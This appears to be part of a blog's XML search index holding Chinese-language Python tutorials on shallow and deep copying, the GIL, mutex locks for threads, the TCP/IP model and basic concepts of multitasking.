        <content type="html"><![CDATA[<h1 id="面试题-深拷贝和浅拷贝的区别是什么？"><a href="#面试题-深拷贝和浅拷贝的区别是什么？" class="headerlink" title="面试题:深拷贝和浅拷贝的区别是什么？"></a>面试题:深拷贝和浅拷贝的区别是什么？</h1><p>深拷贝是将对象本身<strong>复制</strong>给另一个对象.这意味着如果对<strong>对象副本进行修改时不会影响原对象</strong>.<br>使用<strong>copy.deepcopy()</strong>进行深拷贝.<br>浅拷贝是将对象的<strong>引用复制</strong>给另一个对象.因此如果<strong>在副本中进行更改,则会影响原对象</strong>.<br>使用<strong>copy.copy()</strong>进行浅拷贝.</p><p>如果copy.copy()拷贝的是元组,那么它不会进行浅拷贝,仅仅是指向,<br>原因:<br>因为元组是不可变类型,那么意味着数据不能被修改,因此使用copy.copy的时候它会自动判断,如果是元组即为指向它</p><h2 id="浅拷贝对不可变类型和可变类型的copy不同"><a href="#浅拷贝对不可变类型和可变类型的copy不同" class="headerlink" title="浅拷贝对不可变类型和可变类型的copy不同"></a>浅拷贝对不可变类型和可变类型的copy不同</h2><p><strong>copy.copy对于可变类型，会进行浅拷贝</strong><br>拷贝列表(浅拷贝)</p><pre><code>In [37]: a = [11,22]In [38]: a = bIn [39]: id(a)Out[39]: 1450292786952In [40]: id(b)Out[40]: 1450292786952In [41]: c = copy(a)In [42]: id(c)Out[42]: 1450285430728</code></pre><p><strong>copy.copy对于不可变类型，不会拷贝，仅仅是指向</strong><br>拷贝元组(非浅拷贝)</p><pre><code>In [43]: a = (11,22)In [44]: b = copy(a)In [45]: id(a)Out[45]: 1450293531912In [46]: id(b)Out[46]: 1450293531912</code></pre><p><strong>使用Deepcopy()方法拷贝元组,这里也不是拷贝,而是指向</strong></p><pre><code>In [47]: a = (11,22)In [48]: b = deepcopy(a)In [49]: aOut[49]: (11, 22)In [50]: bOut[50]: (11, 22)In [51]: id(a)Out[51]: 1450285549896In [52]: id(b)Out[52]: 1450285549896</code></pre><p><strong>如果元组中有可变数据类型,使用copy不会拷贝而是指向,但是使用Deepcopy的时候会进行深拷贝.</strong></p><pre><code>In [53]: a = [11,22]In [54]: b = [33,44]In [55]: c = (a,b)In [56]: d = copy(c)In [57]: id(c)Out[57]: 1450292947720In [58]: id(d)Out[58]: 1450292947720In [59]:In [59]: e = deepcopy(c)In [60]: id(e)Out[60]: 1450285501960In [61]: id(c)Out[61]: 1450292947720In [62]: a.append(99)In [63]: cOut[63]: ([11, 22, 99], [33, 44])In [64]: eOut[64]: ([11, 22], [33, 44])</code></pre><p>结论:<br>如果用copy,deepcopy<strong>对一个全部都是不可变数据类型的数据进行拷贝,那么他们结果相同,都是引用指向.</strong><br>如果<strong>拷贝的一个拥有可变数据类型的数据,即使元组是在最顶层,那么deepcopy依然是深拷贝</strong>,而copy则是指向.</p><p><strong>给函数传递实参的时候传递的是引用.</strong><br>变量名=值—–&gt;指向<br>浅拷贝:<strong>拷贝最顶层</strong><br>变量名=另一个变量名也是浅拷贝</p><h1 id="其他方式的拷贝"><a href="#其他方式的拷贝" class="headerlink" title="其他方式的拷贝"></a>其他方式的拷贝</h1><p><strong>切片赋值也是一种浅拷贝</strong></p><pre><code>In [1]: a = [11,22]In [2]: b = [33,44]In [3]: c = [a,b]In [6]: d = c[:]In [7]: id(d)Out[7]: 3129848727688In [8]: id(c)Out[8]: 3129848727880In [9]: id(c[0])Out[9]: 3129855906312In [10]: id(d[0])Out[10]: 3129855906312In [11]: aOut[11]: [11, 22]In [12]: bOut[12]: [33, 44]In [13]: a.append(110)In [14]: cOut[14]: [[11, 22, 110], [33, 44]]In [15]: dOut[15]: [[11, 22, 110], [33, 44]]</code></pre><p><strong>字典的copy()方法拷贝的是一个字典</strong></p><pre><code>In [39]: d = dict(name=&quot;刘备&quot;,age=22,son_ages = [11,22])In [40]: dOut[40]: {&#39;name&#39;: &#39;刘备&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22]}In [41]: co = d.copy()In [42]: coOut[42]: {&#39;name&#39;: &#39;刘备&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22]}In [43]: d[&quot;son_ages&quot;].append(99)In [44]: dOut[44]: {&#39;name&#39;: &#39;刘备&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22, 99]}In [45]: coOut[45]: {&#39;name&#39;: &#39;刘备&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22, 99]}In [46]: id(d)Out[46]: 3129856433536In [47]: id(co)Out[47]: 3129856433248</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python中的GIL问题</title>
      <link href="/2018/11/12/python-zhong-de-gil-wen-ti/"/>
      <url>/2018/11/12/python-zhong-de-gil-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是GIL"><a href="#什么是GIL" class="headerlink" title="什么是GIL"></a>什么是GIL</h1><p>简单来说，Python全局解释器锁或GIL是一个互斥锁，它只允许一个线程来控制Python解释器<br>这意味着在任何时间点只有一个线程可以处于执行状态。执行单线程程序的开发人员看不到GIL的影响，但它可能是CPU绑定和<strong>多线程代码中的性能瓶颈</strong><br>由于即使在具有多个CPU核心的多线程体系结构中，GIL一次只允许一个线程执行，因此GIL已经赢得了Python的“臭名昭着”特性的声誉。<br>Python官网对GIL的解释:</p><blockquote><p>在CPython中，全局解释器锁（GIL）是一个互斥锁，用于保护对Python对象的访问，<strong>防止多个线程同时执行Python字节码</strong>。这种锁是必要的，主要是因为CPython的<strong>内存管理不是线程安全</strong>的。（但是，由于GIL存在，其他功能已经增长，取决于它强制执行的保证。</p></blockquote><h1 id="GIL为Python解决了什么问题？"><a href="#GIL为Python解决了什么问题？" class="headerlink" title="GIL为Python解决了什么问题？"></a>GIL为Python解决了什么问题？</h1><pre><code>import sysa = []        # 创建一个列表对象b = a        # 将列表对象的引用指向bsys.getrefcount(a)        # 查看a的引用计数</code></pre><p>回到GIL的问题:<br>问题是这个引用计数变量需要保护竞争条件，其中两个线程同时增加或减少其值。如果发生这种情况，它可能会导致从未释放的泄漏内存，或者更糟糕的是，在对该对象的引用仍然存在时错误地释放内存。这可能会导致Python程序中出现崩溃或其他“怪异”错误<br>问题是，这个引用计数变量需要防止两个线程同时增加或减少对其值的资源竞争。如果发生这种情况，它可能导致永远不会释放的泄漏内存，或者更糟糕的是，在仍然存在对该对象的引用时错误地释放内存。这可能会导致Python程序崩溃或其他“奇怪”的错误。<br>通过向跨线程共享的所有数据结构添加锁，可以保持此引用计数变量的安全，从而不会对它们进行不一致的修改。<br>但是为每个对象或对象组添加一个锁意味着会存在多个锁，这可能会导致另一个问题-<strong>死锁</strong>（死锁只有在有多个锁的情况下才会发生）。另一个副作用是由于重复获取和释放锁而导致性能下降。<br>GIL是解释器本身的单个锁，它增加了一条规则，即执行任何Python字节码都需要获取解释器锁。这可以防止死锁（因为只有一个锁）并且不会引入太多的性能开销。但它有效地使任何受CPU限制的Python程序都是单线程的。<br>GIL虽然被解释器用于其他语言（如Ruby），但并不是解决此问题的唯一方法。有些语言通过使用除引用计数之外的方法（例如垃圾收集）来避免GIL对线程安全内存管理的要求。<br>另一方面，这意味着这些语言通常需要通过添加其他性能提升功能（如JIT编译器）来弥补GIL单线程性能优势的损失。</p><h1 id="为什么选择GIL作为解决方案？"><a href="#为什么选择GIL作为解决方案？" class="headerlink" title="为什么选择GIL作为解决方案？"></a>为什么选择GIL作为解决方案？</h1><p>自从操作系统没有线程概念以来，Python就已存在。Python的设计易于使用，以便更快地开发，越来越多的开发人员开始使用它。<br>GIL易于实现，很容易添加到Python中。它为单线程程序提供了性能提升，因为只需要管理一个锁。</p><h1 id="对多线程Python程序的影响"><a href="#对多线程Python程序的影响" class="headerlink" title="对多线程Python程序的影响"></a>对多线程Python程序的影响</h1><p>当您查看典型的Python程序或任何计算机程序时，它们在性能上受CPU限制的程序与受I / O限制的程序之间存在差异。<br>CPU绑定程序是那些将CPU推向极限的程序。这包括进行数学计算的程序，如矩阵乘法，搜索，图像处理等。<br>I/O绑定程序是花费时间等待输入/输出的程序，可以来自用户，文件，数据库，网络等.I / O绑定程序有时需要等待大量时间，直到它们由于源可能需要在输入/输出准备好之前进行自己的处理，例如，用户考虑输入到输入提示中的内容或在其中运行的数据库查询，因此从源获取他们需要的内容自己的过程。</p><p>下面是一个简单的使用CPU执行倒计时的程序</p><pre><code># single_threaded.pyimport timefrom threading import ThreadCOUNT = 50000000def countdown(n):    while n&gt;0:        n -= 1start = time.time()countdown(COUNT)end = time.time()print(&#39;Time taken in seconds -&#39;, end - start)</code></pre><p>它的运行时间:</p><blockquote><p>Time taken in seconds - 2.4703943729400635</p></blockquote><p>修改上面的代码,使用多线程执行</p><pre><code>import timefrom threading import ThreadCOUNT = 50000000def countdown(n):    while n&gt;0:        n -= 1t1 = Thread(target=countdown, args=(COUNT//2,))t2 = Thread(target=countdown, args=(COUNT//2,))start = time.time()t1.start()t2.start()t1.join()t2.join()end = time.time()print(&#39;Time taken in seconds -&#39;, end - start)</code></pre><p>执行时间:</p><blockquote><p>Time taken in seconds - 2.581101655960083</p></blockquote><p>两个版本的完成时间几乎相同。在多线程版本中，GIL<strong>阻止</strong>了CPU绑定<strong>线程并行执行</strong>。<br>GIL对I/O绑定多线程程序的性能影响不大，因为线程在等待I/O操作时共享锁。<br>但是线程完全受CPU限制的程序，例如，使用线程处理部分图像的程序，不仅会因锁而变成单线程，而且还会看到执行时间的增加，如上例所示，与编写为完全单线程的场景相比。这种增加是由锁添加的获取和释放开销的结果。</p><h1 id="如何解决Python的GIL问题"><a href="#如何解决Python的GIL问题" class="headerlink" title="如何解决Python的GIL问题"></a>如何解决Python的GIL问题</h1><p>###1: 使用多进程<br>您可以使用多个进程而不是线程。每个Python进程都有自己的Python解释器和内存空间，因此GIL不会成为问题。Python有一个multiprocessing模块，可以让我们像这样轻松地创建进程.<br>下面的代码使用多进程完成倒计时</p><pre><code>from multiprocessing import Poolimport timeCOUNT = 50000000def countdown(n):    while n&gt;0:        n -= 1if __name__ == &#39;__main__&#39;:    pool = Pool(processes=2)    start = time.time()    r1 = pool.apply_async(countdown, [COUNT//2])    r2 = pool.apply_async(countdown, [COUNT//2])    pool.close()    pool.join()    end = time.time()    print(&#39;Time taken in seconds -&#39;, end - start)</code></pre><p>运行时间:</p><blockquote><p>Time taken in seconds - 1.7246742248535156<br>是不是快了很多.</p></blockquote><h3 id="2-使用其他Python解释器"><a href="#2-使用其他Python解释器" class="headerlink" title="2:使用其他Python解释器"></a>2:使用其他Python解释器</h3><p>Python有多个解释器实现。分别用C，Java，C＃和Python编写的CPython，Jython，IronPython和PyPy是最受欢迎的。<strong>GIL仅存在于CPython的原始Python实现中</strong>。如果您的程序及其库可用于其他实现之一，那么您也可以尝试它们。</p><h3 id="3-将多线程处理的业务用其他语言实现"><a href="#3-将多线程处理的业务用其他语言实现" class="headerlink" title="3:将多线程处理的业务用其他语言实现"></a>3:将多线程处理的业务用其他语言实现</h3><p>在业务中使用多线程的模块使用其他语言进行实现,然后使用Python调用,这也就是Python被称为<strong>胶水语言</strong>的原因.</p><h1 id="GIL面试题"><a href="#GIL面试题" class="headerlink" title="GIL面试题"></a>GIL面试题</h1><p>描述Python GIL的概念， 以及它对python多线程的影响？编写一个多线程抓取网页的程序，并阐明多线程抓取程序是否可比单线程性能有提升，并解释原因。</p><p>Python之父Guido(龟叔)的声名:<a href="http://www.artima.com/forums/flat.jsp?forum=106&amp;thread=214235" target="_blank" rel="noopener">http://www.artima.com/forums/flat.jsp?forum=106&amp;thread=214235</a></p><p><strong>he language doesn’t require the GIL – it’s only the CPython virtual machine that has historically been unable to shed it.</strong></p><p>参考答案:</p><ol><li>Python语言和GIL没有半毛钱关系。仅仅是由于历史原因在Cpython虚拟机(解释器)，难以移除GIL。</li><li>GIL：全局解释器锁。每个线程在执行的过程都需要先获取GIL，保证同一时刻只有一个线程可以执行代码。</li><li><p>线程释放GIL锁的情况： 在IO操作等可能会引起阻塞的system call之前,可以暂时释放GIL,但在执行完毕后,必须重新获取GIL Python 3.x使用计时器(执行时间达到阈值后，当前线程释放GIL)或Python 2.x，tickets计数达到100</p><blockquote><pre><code>import  sysprint sys.getcheckinterval()        # 100</code></pre><p>python的字节码解释器的工作原理是按照指令的顺序一条一条的顺序执行，Python内部维护着一个数值，这个数值就是Python内部的时钟，如果这个数值为N，则意味着Python在执行了N条指令以后应该立即启动线程调度机制。<br>Python默认是在执行了100条指令后启动线程调度机制。实际上，这个值不仅仅用来进行线程调度，在内部，Python也使用它来检查是否有异步的时间（envent）发生，需要处理。我们可以通过 sys.setcheckinterval() 来调节这个值。<br>Python中的多线程机制也是建立在操作系统的原生线程的基础之上，对应不同的操作系统，有不同的实现，然而最终，在不同的原生线程基础上，Python提供了一套统一的抽象机制，给Python的使用者一个非常简单而方便的多线程工具箱，这就是python中的两个Module：thread以及在其之上的threading。</p></blockquote></li><li><p><strong>Python使用多进程是可以利用多核的CPU资源的。</strong></p></li><li><strong>多线程爬取比单线程性能有提升，因为遇到IO阻塞会自动释放GIL锁</strong></li></ol><p>什么时候用线程什么时候用协程,以及什么时候用进程呢?<br><strong>计算密集型:进程</strong><br><strong>IO密集型:线程,协程</strong><br>因为GIL的原因在处理计算密集型业务的时候(科学计算,挖矿等)线程的性能要远比进程弱很多<br>但是在处理IO密集型业务(爬虫)的时候<strong>线程在等待I/O操作时共享锁</strong>,所以线程的执行效率要比进程强很多.</p><h1 id="文章中的一些概念"><a href="#文章中的一些概念" class="headerlink" title="文章中的一些概念"></a>文章中的一些概念</h1><p>并发:</p><blockquote><p>指的是任务数多于CPU的核数,通过操作系统的各种任务调度算法,实现用多个任务”<strong>一起</strong>“执行(实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已)</p></blockquote><p>并行:</p><blockquote><p>指的是任务数小于或等于CPU的核数,即多个任务是真的一起执行的.</p></blockquote><p>内存泄露</p><blockquote><p>在计算机科学中，内存泄漏指由于疏忽或错误造成<strong>程序未能释放已经不再使用的内存</strong>。<strong>内存泄漏并非指内存在物理上的消失</strong>，而是应用程序分配某段内存后，由于设计错误，导致在释放该段内存之前就失去了对该段内存的控制，从而造成了<strong>内存的浪费</strong>。—WIKI百科</p></blockquote><p>python多线程机制</p><blockquote><p><a href="https://www.cnblogs.com/chenchao1990/p/5101973.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenchao1990/p/5101973.html</a></p></blockquote><p>JIT编译器</p><blockquote><p> OracleJDK提供的HotspotJVM,提供了 JIT（Just-In-Time）编译器，也就是通常所说的动态编译器,JIT能够在运行时将热点代码编译成机器码.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIL </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>线程中的互斥锁</title>
      <link href="/2018/11/11/xian-cheng-zhong-de-hu-chi-suo/"/>
      <url>/2018/11/11/xian-cheng-zhong-de-hu-chi-suo/</url>
      
        <content type="html"><![CDATA[<h2 id="多线程开发可能遇到的问题"><a href="#多线程开发可能遇到的问题" class="headerlink" title="多线程开发可能遇到的问题"></a>多线程开发可能遇到的问题</h2><p>假设两个线程t1和t2都要对全局变量g_num(默认是0)进行加1运算，t1和t2都各对g_num加10次，g_num的最终的结果应该为20。</p><p>但是由于是多线程同时操作，有可能出现下面情况：</p><ol><li><p>在g_num=0时，t1取得g_num=0。此时系统把t1调度为”sleeping”状态，把t2转换为”running”状态，t2也获得g_num=0</p></li><li><p>然后t2对得到的值进行加1并赋给g_num，使得g_num=1</p></li><li><p>然后系统又把t2调度为”sleeping”，把t1转为”running”。线程t1又把它之前得到的0加1后赋值给g_num。</p></li><li><p>这样导致虽然t1和t2都对g_num加1，但结果仍然是g_num=1</p></li></ol><pre><code>from threading import Threadfrom time import sleep__author__ = &#39;Chen&#39;__date__ = &#39;2018/11/4 15:58&#39;# 多线程在使用全局变量的时候会引发资源竞争问题g_num = 0       # 全局变量def test1(num):    global g_num    for i in range(num):        g_num += 1    print(&#39;test1方法中全局变量的值为:%d&#39;%g_num)def test2(num):    global g_num    for i in range(num):        g_num += 1    print(&quot;test2方法中全局变量的值为:%d&quot;%g_num)def main():    t1 = Thread(target=test1,args=(1000000,))    t2 = Thread(target=test2,args=(1000000,))    t1.start()    t2.start()    sleep(5)    print(&quot;main方法内全局变量的值为:%d&quot;%g_num)if __name__ == &#39;__main__&#39;:    main()</code></pre><h2 id="如何解决多线程同时修改全局变量而造成的竞争问题"><a href="#如何解决多线程同时修改全局变量而造成的竞争问题" class="headerlink" title="如何解决多线程同时修改全局变量而造成的竞争问题"></a>如何解决多线程同时修改全局变量而造成的竞争问题</h2><p>那么就应该使用同步<br>同步就是<strong>协同步调</strong>，按<strong>预定的先后次序进行运行</strong>。如:你说完，我再说。<br><strong>“同”</strong>字从字面上容易理解为一起动作<br>其实不是，<strong>“同”字应是指协同、协助、互相配合。</strong><br>如进程、线程同步，可理解为进程或线程A和B一块配合，A执行到一定程度时要依靠B的某个结果，于是停下来，示意B运行;B执行，再将结果给A;A再继续操作。</p><h3 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h3><p>当多个线程几乎同时修改某一个共享数据的时候，需要进行<strong>同步控制</strong><br>线程同步能够保证多个线程安全访问竞争资源，最简单的同步机制是引入<strong>互斥锁。</strong></p><blockquote><p>在计算机科学中，互斥是并发控制的一种特性，它是为了防止竞争条件而制定的; 要求一个执行线程永远不会进入其关键部分，同时另一个并发执行线程进入其自己的关键部分 —维基百科</p></blockquote><p>互斥锁为资源引入一个状态：<strong>锁定/非锁定</strong><br><strong>某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。</strong><br><strong>使用互斥锁解决上面代码中全局变量的资源竞争问题</strong></p><pre><code>from threading import Lock, Threadfrom time import sleep__author__ = &#39;Chen&#39;__date__ = &#39;2018/11/4 16:27&#39;# 上锁的原则:上锁的代码越少越好g_num = 0  # 定义一个全局变量mutex = Lock()  # 创建一个互斥锁,默认是没有上锁的def test1(num):    global g_num    for i in range(num):        mutex.acquire()  # 上锁        g_num += 1        mutex.release()  # 解锁    print(&#39;在test2()方法中全局变量的值%d&#39; % g_num)def test2(num):    global g_num    for i in range(num):        mutex.acquire()  # 上锁        g_num += 1        mutex.release()  # 解锁    print(&#39;在test2()方法中全局变量的值%d&#39; % g_num)def main():    # 创建线程对象(并没有创建线程哦)    t1 = Thread(target=test1, args=(100000,))    t2 = Thread(target=test2, args=(100000,))    t1.start()    t2.start()    sleep(2)    print(&#39;main方法中全局变量的值为:%d&#39; % g_num)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><strong>上锁解锁过程</strong></p><blockquote><ol><li>当一个线程调用锁的acquire()方法获得锁时，锁就进入“locked”状态。</li></ol></blockquote><blockquote><ol start="2"><li>每次只有一个线程可以获得锁。如果此时另一个线程试图获得这个锁，该线程就会变为“blocked”状态，称为“阻塞”，直到拥有锁的线程调用锁的release()方法释放锁之后，锁进入“unlocked”状态。</li></ol></blockquote><blockquote><ol start="3"><li>线程调度程序从处于同步阻塞状态的线程中选择一个来获得锁，并使得该线程进入运行（running）状态。</li></ol></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>锁的好处: </p><ul><li>确保了某段关键代码只能由一个线程从头到尾完整地执行</li><li><p>锁的坏处:</p></li><li><p>阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了</p></li><li>由于可以存在多个锁，不同的线程持有不同的锁，并试图获取对方持有的锁时，可能会造成死锁</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多任务 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>TCPIP协议</title>
      <link href="/2018/11/11/tcpip-xie-yi/"/>
      <url>/2018/11/11/tcpip-xie-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是协议"><a href="#什么是协议" class="headerlink" title="什么是协议"></a>什么是协议</h2><p>就像说不同语言的人之间沟通一样,只要有一种大家都遵守的协议即可,有的人会说中文,有的人会说法语,有的人会说俄语但是为了解决人们之间的沟通障碍,现在规定国际语言为”英语”,这就是一个<strong>规定</strong>,这个<strong>规定就叫协议</strong>.</p><h2 id="计算机之间如何沟通"><a href="#计算机之间如何沟通" class="headerlink" title="计算机之间如何沟通"></a>计算机之间如何沟通</h2><p>就像说不同语言的人沟通一样，只要有一种大家都认可都遵守的协议即可，那么这个计算机都遵守的网络通信协议叫做TCP/IP协议</p><h2 id="TCP-IP协议-族"><a href="#TCP-IP协议-族" class="headerlink" title="TCP/IP协议(族)"></a>TCP/IP协议(族)</h2><p>为了把全世界的所有不同类型的计算机都连接起来，就必须规定一套全球通用的协议，为了实现互联网这个目标，互联网协议族（Internet Protocol Suite）就是通用协议标准。</p><p>因为互联网协议包含了上百种协议标准，但是最重要的两个协议是TCP和IP协议，所以，大家把<strong>互联网的协议</strong>简称<strong>TCP/IP协议(族)</strong></p><p><strong>TCP/IP协议(族)</strong>是互联网协议套件中的两个主要协议,提供特定功能。</p><blockquote><p><strong>TCP定义了应用程序如何在网络上创建通信通道</strong>。它还<strong>管理消息</strong>如何组合成较小的数据包，然后通过<strong>互联网传输并在目的地址以正确的顺序重新组装</strong>。</p></blockquote><blockquote><p>IP定义了如何<strong>寻址和路由每个数据包以确保它到达正确的目的地</strong>。网络上的每台网关计算机都会检查此IP地址，以确定转发邮件的位置。</p></blockquote><h2 id="TCP-IP模型"><a href="#TCP-IP模型" class="headerlink" title="TCP / IP模型"></a>TCP / IP模型</h2><p>TCP / IP功能分为四层，每层包括特定协议。</p><ul><li>应用层为应用程序提供标准化数据交换。其协议包括超文本传输​​协议（HTTP），文件传输协议（FTP），邮局协议3（POP3），简单邮件传输协议（SMTP）和简单网络管理协议（SNMP）。</li><li>传输层负责维护整个网络的端到端通信。TCP处理主机之间的通信，并提供流量控制，多路复用和可靠性。传输协议包括TCP和用户数据报协议（UDP），有时为了特殊目的而使用TCP而不是TCP。</li><li>网络层（也称为互联网层）处理分组并连接独立网络以跨网络边界传输分组。网络层协议是IP和Internet控制消息协议（ICMP），用于错误报告。</li><li>物理层由仅在链路上运行的协议组成 - 链路是连接网络中节点或主机的网络组件。该层中的协议包括用于局域网（LAN）的以太网和地址解析协议（ARP）。</li></ul><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/uXcqw6kMBVvAFTQzTJ3jf.ICUmFd0lCGl2CX.daXvEQ!/b/dFQBAAAAAAAA&amp;bo=bAKpAQAAAAADF*Q!&amp;rf=viewer_4" alt="协议标准"></p><p>OSI七层模型只是理论,在现实过程当中用的最多的还是4层模型<br>常用的网络协议以及关系图<br>常用的网络协议包括:</p><blockquote><p>TCP,UDP,ICMP,IGMP,ARP,RARP</p></blockquote><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/YtH*4mHdOGGUARth*V8YNiSDioIMkrjOQ27.40nl1PQ!/b/dLYAAAAAAAAA&amp;bo=TwKzAQAAAAADF80!&amp;rf=viewer_4" alt="常用的网络协议"></p><h2 id="如何传输"><a href="#如何传输" class="headerlink" title="如何传输"></a>如何传输</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/4boEMl8Ez8CB4JJPi4wSy1IDNrCWjq1Y8IoJqo2f780!/b/dFIBAAAAAAAA&amp;bo=vAPnAgAAAAADF2g!&amp;rf=viewer_4" alt="TCP/ip如何传输"></p><h2 id="TCP-IP的优点"><a href="#TCP-IP的优点" class="headerlink" title="TCP / IP的优点"></a>TCP / IP的优点</h2><p>TCP / IP具有高度可扩展性，并且作为可路由协议，可以确定通过网络的最有效路径</p>]]></content>
      
      
      <categories>
          
          <category> 网络通信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>多任务的概念</title>
      <link href="/2018/11/11/duo-ren-wu-de-gai-nian/"/>
      <url>/2018/11/11/duo-ren-wu-de-gai-nian/</url>
      
        <content type="html"><![CDATA[<p><img src="http://phmes812n.bkt.clouddn.com/%E5%A4%9A%E4%BB%BB%E5%8A%A1.png" alt="多任务"></p><p>有很多的场景中的事情是同时进行的，比如开车的时候 手和脚共同来驾驶汽车，再比如唱歌跳舞也是同时进行的；</p><p>什么叫“<strong>多任务</strong>”呢？简单地说，就是<strong>操作系统</strong>可以<strong>同时</strong>运行多个任务。打个比方，<strong>你一边在用浏览器上网，一边在听MP3</strong>，一边在用Word赶作业，这就是多任务，至少同时有3个任务正在运行。还有很多任务悄悄地在后台同时运行着，只是桌面上没有显示而已。</p><p><strong>并发</strong>：指的是<strong>任务数多余cpu核数</strong>，通过操作系统的各种任务调度算法，实现用多个任务“一起”执行（实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已）</p><p><strong>并行</strong>：指的是<strong>任务数小于等于cpu核数</strong>，即任务真的是一起执行的</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thread </tag>
            
            <tag> 多任务 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
